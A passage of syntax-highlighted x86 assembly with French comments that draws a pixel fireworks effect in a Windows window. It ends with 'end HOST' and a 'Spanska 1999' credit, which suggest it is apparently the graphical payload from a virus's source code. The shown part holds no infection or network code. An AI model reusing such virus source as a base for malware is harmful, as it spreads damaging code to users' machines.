</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">001000h</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">point_pas_noir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_loop</span><span class="sc0">

</span><span class="sc5">point_pas_noir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">R_pas_a_zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">R_pas_a_zero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">G_pas_a_zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">G_pas_a_zero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">B_pas_a_zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">B_pas_a_zero</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;colorref</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;y</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;x</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">theDC</span><span class="sc0">      </span><span class="sc1">;the Device Context</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetPixelV</span><span class="sc0">      </span><span class="sc1">;quand la fenetre est repeinte, on met le pixel à sa coordonnée</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">theDC</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetPixelV</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">fin_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">zozo2</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">compteur</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">msg_loop</span><span class="sc0">

</span><span class="sc1">;----- pour voir si la fenetre est fermée</span><span class="sc0">

</span><span class="sc5">process_messages</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">msMESSAGE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">  </span><span class="sc1">;WM_QUIT equ 0012h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_loop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TranslateMessage</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DispatchMessageA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">msg_loop</span><span class="sc0">

</span><span class="sc5">end_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">theDC</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle_wd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReleaseDC</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">pas_d_effet_graphique</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">stop2</span><span class="sc0">

</span><span class="sc1">;----- procédure de fenêtre vide pour accélérer</span><span class="sc0">

</span><span class="sc5">wndproc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">adresse_retour</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite_prout</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostQuitMessage</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suite2</span><span class="sc0">

</span><span class="sc5">suite_prout</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DefWindowProcA</span><span class="sc0">

</span><span class="sc5">suite2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">adresse_retour</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----- procédure pour initialiser une explosion</span><span class="sc0">

</span><span class="sc5">ini_explosion</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nb_explosions</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nombre_explosion_maxi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">nb_explosions</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">xx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">yy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AF0F0Fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">zozo</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;slow but good for size</span><span class="sc0">
</span><span class="sc7">fsin</span><span class="sc0">
</span><span class="sc7">fimul</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fcos</span><span class="sc0">
</span><span class="sc7">fimul</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fistp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fistp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">yy</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">xx</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">zozo</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">nb_explosions</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">la_suite@</span><span class="sc0">

</span><span class="sc1">;----- random</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">214013h</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc5">seed</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Prevent divide overflow by caller</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2531011h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">seed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">

</span><span class="sc1">;--------------------------- (c) Spanska 1999 ---------------------------------</span><span class="sc0">
</span></div></body>
</html>
